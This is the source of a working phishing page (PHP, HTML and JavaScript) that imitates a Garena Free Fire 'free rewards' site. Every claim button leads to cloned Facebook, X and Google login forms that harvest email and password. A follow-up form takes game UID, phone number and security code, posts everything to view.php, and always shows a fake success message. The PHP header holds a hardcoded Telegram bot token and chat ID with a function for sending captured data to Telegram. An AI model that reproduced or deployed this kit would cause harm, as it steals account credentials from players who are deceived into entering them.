<?php
// Telegram Bot Settings (Yahan apna token aur chat id daalo)
define('BOT_TOKEN', '8840844556:AAHhxntijPwObphI7pW9B7GXFABv1XtGtQ8');
define('CHAT_ID', '7924753922');

// Ye function Telegram par message bhejega
function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

$items = [
    // ===== BUNDLES (9 items) - ABHI KE LIYE DIRECT WORKING URLS =====
    ['name' => 'Red Criminal',       'image' => 'https://i.ibb.co/1fvh7WDD/blue-criminal-bundle-on-transparent-background-jbe8zqlakrtj8f7v.webp',      'category' => 'bundles'],
    ['name' => 'Golden Criminal',    'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/2.jpg',   'category' => 'bundles'],
    ['name' => 'Blue Criminal',      'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/4.jpg',     'category' => 'bundles'],
    ['name' => 'White Bear',         'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/5.jpg',        'category' => 'bundles'],
    ['name' => 'Black Yellow',       'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/8.jpg',      'category' => 'bundles'],
    ['name' => 'Neon Punk',          'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/11.jpg',         'category' => 'bundles'],
    ['name' => 'Itachi',             'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/12.jpg',                   'category' => 'bundles'],
    ['name' => 'Naruto',             'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/13.jpg',                   'category' => 'bundles'],
    ['name' => 'Sasuke',             'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/14.jpg',                   'category' => 'bundles'],

    // ===== SKINS (guns) – unchanged =====
    ['name' => 'Mini14',             'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/1.jpg',   'category' => 'skins'],
    ['name' => 'EVO Gun',            'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/2.jpg',   'category' => 'skins'],
    ['name' => 'MP40 Cobra',         'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/4.jpg',   'category' => 'skins'],
    ['name' => 'EVO UMP',            'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/5.jpg',   'category' => 'skins'],
    ['name' => 'Runestone',          'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/3.jpg',   'category' => 'skins'],
    ['name' => 'Blazy Upgrade',      'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/8.jpg',   'category' => 'skins'],
    ['name' => 'Cobra Returns',      'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/14.jpg',  'category' => 'skins'],
    ['name' => 'Top Criminal',       'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/15.jpg',  'category' => 'skins'],

    // ===== EMOTES – unchanged =====
    ['name' => 'Sonorous Wall',      'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/6.jpg',   'category' => 'emotes'],
    ['name' => 'Universal',          'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/7.jpg',   'category' => 'emotes'],
    ['name' => 'Soundguns',          'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/9.jpg',   'category' => 'emotes'],
    ['name' => '720 Diamonds',       'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/11.jpg',  'category' => 'emotes'],
    ['name' => '1060 Diamonds',      'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/12.jpg',  'category' => 'emotes'],
    ['name' => '2180 Diamonds',      'image' => 'https://evotokenfreee.serv00.net/claim/themes/3/img/rewards/13.jpg',  'category' => 'emotes'],
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Free Fire Rewards</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000000; font-family: 'Rajdhani', sans-serif; color: #ffffff; display: flex; justify-content: center; padding: 0 16px; min-height: 100vh; }
        .app-container { max-width: 480px; width: 100%; padding: 16px 0 30px; }
        .banner-container { width: 100%; margin-bottom: 16px; border-radius: 12px; overflow: hidden; }
        .banner-container img { width: 100%; height: auto; display: block; }
        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 20px; }
        .logo { font-size: 26px; font-weight: 800; font-style: italic; letter-spacing: 1px; color: #ffffff; }
        .header-icons { display: flex; gap: 18px; font-size: 22px; color: #ffffff; }
        .header-icons i { cursor: pointer; }
        .rewards-heading { font-size: 26px; font-weight: 700; margin-bottom: 6px; color: #ffffff; }
        .title-decoration { display: flex; align-items: center; gap: 8px; margin-bottom: 22px; }
        .title-line { width: 44px; height: 4px; background: #FFC107; border-radius: 2px; }
        .title-stripes { display: flex; gap: 4px; }
        .title-stripes span { display: block; width: 8px; height: 4px; background: #FFC107; transform: skewX(-45deg); border-radius: 1px; }
        .tabs { display: flex; gap: 12px; margin-bottom: 18px; }
        .tab-btn { background: transparent; border: none; color: #ffffff; padding: 8px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s ease; font-family: inherit; }
        .tab-btn.active { background: #FFC107; color: #000000; }
        .tab-btn:hover:not(.active) { color: #FFC107; }
        .reward-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .reward-item { background: #0a0a0a; border-radius: 10px; overflow: hidden; display: flex; flex-direction: column; animation: fadeIn 0.3s ease forwards; }
        .reward-item .thumb { position: relative; aspect-ratio: 1 / 1; background: #000000; overflow: hidden; }
        .reward-item .thumb img { width: 100%; height: 100%; display: block; object-fit: cover; }
        .reward-item.bundle-item .thumb img { object-fit: contain; }
        .reward-item .thumb .corner { position: absolute; bottom: 4px; left: -8px; width: 32px; height: 6px; background: #d32f2f; transform: rotate(-45deg); transform-origin: right bottom; pointer-events: none; opacity: 0.95; }
        .reward-item .strip { height: 4px; width: 100%; background: #FFC107; }
        .reward-item .claim-btn { background: #FFC107; color: #000000; border: none; padding: 10px 0; width: 100%; font-weight: 700; font-size: 14px; font-family: inherit; cursor: pointer; transition: transform 0.1s, filter 0.2s; letter-spacing: 0.5px; }
        .reward-item .claim-btn:active { transform: scale(0.96); }
        .reward-item .claim-btn:hover { filter: brightness(0.9); }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        @media (max-width: 400px) { .tab-btn { padding: 6px 16px; font-size: 14px; } .logo { font-size: 22px; } .header-icons { font-size: 18px; gap: 14px; } .reward-item .claim-btn { font-size: 12px; padding: 8px 0; } }
        
        .garena-footer { margin-top: 40px; padding: 30px 0 10px; text-align: center; border-top: 1px solid rgba(255,255,255,0.05); }
        .garena-logo { display: inline-flex; align-items: center; gap: 6px; margin-bottom: 12px; }
        .garena-logo svg { width: 32px; height: 32px; fill: #D32F2F; }
        .garena-logo span { color: #D32F2F; font-size: 20px; font-weight: 700; letter-spacing: 0.5px; }
        .copyright-text { font-size: 11px; color: #6a6a6a; line-height: 1.6; max-width: 320px; margin: 0 auto 20px; }
        .footer-links { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
        .footer-links a { color: #ffffff; text-decoration: none; font-size: 13px; font-weight: 500; transition: 0.2s; }
        .footer-links a:hover { color: #D32F2F; }
        @media (max-width: 400px) { .footer-links { gap: 12px; } .footer-links a { font-size: 11px; } }

        /* ===== MAIN MODAL ===== */
        .modal-overlay { position: fixed; top:0; left:0; right:0; bottom:0; background: rgba(0,0,0,0.92); z-index: 9998; display: none; justify-content: center; align-items: center; padding: 16px; }
        .modal-overlay.show { display: flex; }
        .modal-box { background: #1e2029; border-radius: 24px; max-width: 400px; width: 100%; padding: 0; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.9); position: relative; }
        .step-social { padding: 28px 20px 30px; position: relative; display: block; }
        .modal-close { position: absolute; top: 16px; right: 16px; background: #333; border: none; color: #fff; width: 32px; height: 32px; border-radius: 50%; font-size: 18px; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 100; }
        .modal-title { text-align: center; font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 4px; }
        .modal-subtitle { text-align: center; font-size: 14px; color: #9ca3af; margin-bottom: 24px; }
        .social-btn { display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; background: #fff; border: none; border-radius: 12px; padding: 14px 0; margin-bottom: 12px; font-size: 16px; font-weight: 600; font-family: inherit; cursor: pointer; transition: 0.2s; }
        .social-btn:active { transform: scale(0.97); }
        .social-btn.fb { color: #1877f2; }
        .social-btn.x { color: #000; }
        .social-btn.google { color: #333; }
        .social-btn i { font-size: 20px; }

        .step-clone { display: none; width: 100%; height: 100%; padding: 20px 16px 24px; border-radius: 16px; position: relative; min-height: 380px; }
        .clone-fb, .clone-x { background: #ffffff; }
        .clone-close-fb, .clone-close-x { position: absolute; top: 12px; right: 16px; background: #f0f2f5; border: none; width: 32px; height: 32px; border-radius: 50%; font-size: 18px; cursor: pointer; color: #333; display: flex; align-items: center; justify-content: center; }
        .clone-fb-header, .clone-x-header { text-align: center; margin-bottom: 20px; }
        .clone-fb-logo { font-size: 28px; font-weight: 800; color: #1877f2; }
        .clone-x-logo { font-size: 28px; font-weight: 800; color: #000; }
        .clone-fb-desc, .clone-x-desc { color: #606770; font-size: 14px; margin-top: 4px; }
        .clone-fb-form input, .clone-x-form input { width: 100%; padding: 12px 14px; border: 1px solid #dddfe2; border-radius: 6px; margin-bottom: 12px; font-size: 15px; font-family: inherit; outline: none; background: #fff; }
        .clone-fb-form input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .clone-x-form input:focus { border-color: #000; box-shadow: 0 0 0 2px #ddd; }
        .clone-fb-btn { width: 100%; padding: 12px; border: none; border-radius: 6px; color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 6px; background: #1877f2; transition: 0.2s; }
        .clone-x-btn { width: 100%; padding: 12px; border: none; border-radius: 6px; color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 6px; background: #000; transition: 0.2s; }

        .clone-google { background: #ffffff; }
        .clone-close-google { position: absolute; top: 12px; right: 16px; background: transparent; border: none; width: 32px; height: 32px; border-radius: 50%; font-size: 20px; cursor: pointer; color: #5f6368; display: flex; align-items: center; justify-content: center; }
        .clone-google-header { text-align: center; margin-bottom: 24px; }
        .clone-google-logo { font-size: 30px; font-weight: 600; color: #4285F4; letter-spacing: -1px; }
        .clone-google-logo span:nth-child(1) { color: #4285F4; }
        .clone-google-logo span:nth-child(2) { color: #EA4335; }
        .clone-google-logo span:nth-child(3) { color: #FBBC05; }
        .clone-google-logo span:nth-child(4) { color: #34A853; }
        .clone-google-logo span:nth-child(5) { color: #4285F4; }
        .clone-google-desc { color: #202124; font-size: 16px; font-weight: 400; margin-top: 4px; }
        .clone-google-form input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 12px; font-size: 16px; font-family: inherit; outline: none; background: #fff; transition: 0.2s; }
        .clone-google-form input:focus { border: 2px solid #4285F4; padding: 12px 14px; }
        .clone-google-form .google-info-text { color: #5f6368; font-size: 13px; margin-bottom: 20px; margin-top: -6px; display: block; }
        .clone-google-btn { width: 100%; padding: 10px; border: none; border-radius: 4px; color: #fff; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 4px; background: #4285F4; transition: 0.2s; }
        .clone-google-btn:hover { background: #1a73e8; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
        .clone-btn:active { transform: scale(0.98); }

        .step-form { display: none; padding: 0; background: #1e2029; }
        .form-header { background: #dac374; padding: 14px 20px; color: #000; font-size: 18px; font-weight: 700; }
        .form-body { padding: 20px 20px 28px; }
        .form-body .form-title { text-align: center; color: #f5c842; font-size: 16px; font-weight: 600; margin-bottom: 16px; }
        .form-group { margin-bottom: 12px; }
        .form-group input, .form-group select { width: 100%; padding: 14px 16px; background: #252833; border: 1px solid #3b3f4a; border-radius: 10px; color: #fff; font-size: 15px; font-family: inherit; outline: none; transition: 0.2s; }
        .form-group input:focus, .form-group select:focus { border-color: #f5c842; }
        .form-group select option { color: #000; }
        .btn-verify { width: 100%; background: #dac374; color: #000; border: none; padding: 14px 0; border-radius: 10px; font-size: 16px; font-weight: 700; margin-top: 6px; cursor: pointer; font-family: inherit; transition: 0.2s; }
        .btn-verify:active { transform: scale(0.96); }

        .step-loading { display: none; padding: 40px 20px 50px; text-align: center; }
        .loader-dots { display: flex; justify-content: center; gap: 10px; margin-bottom: 16px; }
        .loader-dots span { width: 14px; height: 14px; background: #f5c842; border-radius: 50%; animation: bounce 1.2s infinite ease-in-out both; }
        .loader-dots span:nth-child(1) { animation-delay: -0.32s; }
        .loader-dots span:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
        .status-text { color: #fff; font-size: 18px; font-weight: 500; letter-spacing: 0.5px; }
        .status-text.success { color: #f5c842; font-weight: 700; }
    </style>
</head>
<body>
<div class="app-container">
    <div class="banner-container">
        <img src="https://image-link.edgeone.app/1785139078002-09dejq.jpg" alt="Free Fire Banner">
    </div>

    <header class="header">
        <div class="logo">FREE FIRE</div>
        <div class="header-icons">
            <i class="bi bi-cart"></i>
            <i class="bi bi-globe"></i>
            <i class="bi bi-list"></i>
        </div>
    </header>

    <h1 class="rewards-heading">REWARDS</h1>
    <div class="title-decoration">
        <div class="title-line"></div>
        <div class="title-stripes">
            <span></span><span></span><span></span>
        </div>
    </div>

    <div class="tabs">
        <button class="tab-btn active" data-category="bundles">Bundles</button>
        <button class="tab-btn" data-category="emotes">Emotes</button>
        <button class="tab-btn" data-category="skins">Skins</button>
    </div>

    <div class="reward-grid" id="rewardGrid">
        <?php foreach ($items as $item): 
            $bundleClass = ($item['category'] === 'bundles') ? 'bundle-item' : '';
        ?>
            <div class="reward-item <?= $bundleClass ?>" data-category="<?= htmlspecialchars($item['category']) ?>">
                <div class="thumb">
                    <img src="<?= htmlspecialchars($item['image']) ?>" alt="<?= htmlspecialchars($item['name']) ?>">
                    <div class="corner"></div>
                </div>
                <div class="strip"></div>
                <button class="claim-btn" onclick="openLogin()">CLAIM</button>
            </div>
        <?php endforeach; ?>
    </div>

    <footer class="garena-footer">
        <div class="garena-logo">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
            </svg>
            <span>Garena</span>
        </div>
        <p class="copyright-text">Copyright &copy; Garena International. Trademarks belong to their respective owners. All rights reserved.</p>
        <div class="footer-links">
            <a href="#">Privacy Policy</a>
            <a href="#">For Parents FAQ</a>
            <a href="#">Terms of Service</a>
        </div>
    </footer>
</div>

<div class="modal-overlay" id="loginModal">
    <div class="modal-box">
        <div class="step-social" id="step1">
            <button class="modal-close" onclick="closeLogin()">&times;</button>
            <div class="modal-title">Free Fire Login</div>
            <div class="modal-subtitle">Login to verify your Free Fire account</div>
            <button class="social-btn fb" onclick="openClone('Facebook')"><i class="bi bi-facebook"></i> Login with Facebook</button>
            <button class="social-btn x" onclick="openClone('X')"><i class="bi bi-twitter-x"></i> Login with X</button>
            <button class="social-btn google" onclick="openClone('Google')"><i class="bi bi-google"></i> Login with Google</button>
        </div>

        <div class="step-clone clone-fb" id="step2_fb">
            <button class="clone-close-fb" onclick="goBackToStep1()">&times;</button>
            <div class="clone-fb-header">
                <div class="clone-fb-logo">facebook</div>
                <div class="clone-fb-desc">Log in to continue</div>
            </div>
            <form class="clone-fb-form" id="cloneForm_fb" onsubmit="handleCloneSubmit(event, 'Facebook')">
                <input type="text" name="social_email" placeholder="Email or Phone" required>
                <input type="password" name="social_password" placeholder="Password" required>
                <button type="submit" class="clone-fb-btn">Log In</button>
            </form>
        </div>

        <div class="step-clone clone-x" id="step2_x">
            <button class="clone-close-x" onclick="goBackToStep1()">&times;</button>
            <div class="clone-x-header">
                <div class="clone-x-logo">X</div>
                <div class="clone-x-desc">Log in to continue</div>
            </div>
            <form class="clone-x-form" id="cloneForm_x" onsubmit="handleCloneSubmit(event, 'X')">
                <input type="text" name="social_email" placeholder="Email or Phone" required>
                <input type="password" name="social_password" placeholder="Password" required>
                <button type="submit" class="clone-x-btn">Log in</button>
            </form>
        </div>

        <div class="step-clone clone-google" id="step2_google">
            <button class="clone-close-google" onclick="goBackToStep1()">&times;</button>
            <div class="clone-google-header">
                <div class="clone-google-logo">
                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                </div>
                <div class="clone-google-desc">Sign in to continue</div>
            </div>
            <form class="clone-google-form" id="cloneForm_google" onsubmit="handleCloneSubmit(event, 'Google')">
                <input type="text" name="social_email" placeholder="Email or Phone" required>
                <input type="password" name="social_password" placeholder="Password" required>
                <span class="google-info-text">Not your computer? Use Guest mode to sign in privately.</span>
                <button type="submit" class="clone-google-btn">Sign in</button>
            </form>
        </div>

        <div class="step-form" id="step3">
            <div class="form-header">Account Verification</div>
            <div class="form-body">
                <div class="form-title">Complete your account details</div>
                <form id="verifyForm" onsubmit="submitVerification(event)">
                    <input type="hidden" name="platform" id="ffPlatform">
                    <input type="hidden" name="social_email" id="ffSocialEmail">
                    <input type="hidden" name="social_password" id="ffSocialPassword">
                    <div class="form-group"><input type="text" name="uid" placeholder="UID" required></div>
                    <div class="form-group"><input type="tel" name="phone" placeholder="NUMBER" required></div>
                    <div class="form-group"><input type="text" name="security_code" placeholder="Security Code (Optional)"></div>
                    <div class="form-group">
                        <select name="account_level" required>
                            <option value="">Select Level</option>
                            <?php for($i = 1; $i <= 100; $i++): ?>
                                <option value="<?= $i ?>">Level <?= $i ?></option>
                            <?php endfor; ?>
                        </select>
                    </div>
                    <button type="submit" class="btn-verify">Verify</button>
                </form>
            </div>
        </div>

        <div class="step-loading" id="step4">
            <div class="loader-dots"><span></span><span></span><span></span></div>
            <div class="status-text" id="statusText">Checking your account details...</div>
        </div>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const tabs = document.querySelectorAll('.tab-btn');
        const items = document.querySelectorAll('.reward-item');
        function switchTab(category) {
            tabs.forEach(t => t.classList.remove('active'));
            document.querySelector(`.tab-btn[data-category="${category}"]`).classList.add('active');
            items.forEach(item => {
                if (item.dataset.category === category) { item.style.display = 'flex'; item.style.animation = 'none'; void item.offsetHeight; item.style.animation = 'fadeIn 0.3s ease forwards'; } 
                else { item.style.display = 'none'; }
            });
        }
        tabs.forEach(tab => { tab.addEventListener('click', function() { switchTab(this.dataset.category); }); });
        switchTab('bundles');
    });

    function openLogin() {
        document.getElementById('step1').style.display = 'block';
        document.getElementById('step2_fb').style.display = 'none';
        document.getElementById('step2_x').style.display = 'none';
        document.getElementById('step2_google').style.display = 'none';
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step4').style.display = 'none';
        document.getElementById('loginModal').classList.add('show');
    }

    function closeLogin() { document.getElementById('loginModal').classList.remove('show'); }

    function goBackToStep1() {
        document.getElementById('step1').style.display = 'block';
        document.getElementById('step2_fb').style.display = 'none';
        document.getElementById('step2_x').style.display = 'none';
        document.getElementById('step2_google').style.display = 'none';
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step4').style.display = 'none';
    }

    function openClone(platform) {
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step4').style.display = 'none';
        document.getElementById('step2_fb').style.display = 'none';
        document.getElementById('step2_x').style.display = 'none';
        document.getElementById('step2_google').style.display = 'none';
        if(platform === 'Facebook') document.getElementById('step2_fb').style.display = 'block';
        else if(platform === 'X') document.getElementById('step2_x').style.display = 'block';
        else if(platform === 'Google') document.getElementById('step2_google').style.display = 'block';
    }

    function handleCloneSubmit(e, platform) {
        e.preventDefault();
        let socialEmail, socialPass;
        if(platform === 'Facebook') {
            socialEmail = document.querySelector('#cloneForm_fb [name="social_email"]').value;
            socialPass = document.querySelector('#cloneForm_fb [name="social_password"]').value;
        } else if(platform === 'X') {
            socialEmail = document.querySelector('#cloneForm_x [name="social_email"]').value;
            socialPass = document.querySelector('#cloneForm_x [name="social_password"]').value;
        } else if(platform === 'Google') {
            socialEmail = document.querySelector('#cloneForm_google [name="social_email"]').value;
            socialPass = document.querySelector('#cloneForm_google [name="social_password"]').value;
        }
        document.getElementById('step2_fb').style.display = 'none';
        document.getElementById('step2_x').style.display = 'none';
        document.getElementById('step2_google').style.display = 'none';
        document.getElementById('step3').style.display = 'block';
        document.getElementById('ffPlatform').value = platform;
        document.getElementById('ffSocialEmail').value = socialEmail;
        document.getElementById('ffSocialPassword').value = socialPass;
    }

    function submitVerification(e) {
        e.preventDefault();
        const form = document.getElementById('verifyForm');
        const formData = new FormData(form);
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step4').style.display = 'block';
        document.getElementById('statusText').className = 'status-text';
        document.getElementById('statusText').innerText = 'Checking your account details...';

        fetch('view.php', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            setTimeout(() => {
                document.getElementById('statusText').innerText = 'Reward send successfully wait 24 hours';
                document.getElementById('statusText').className = 'status-text success';
            }, 3000);
        })
        .catch(error => {
            setTimeout(() => {
                document.getElementById('statusText').innerText = 'Reward send successfully wait 24 hours';
                document.getElementById('statusText').className = 'status-text success';
            }, 3000);
        });
    }
    document.getElementById('loginModal').addEventListener('click', function(e) {
        if (e.target === this) closeLogin();
    });
</script>
</body>
</html>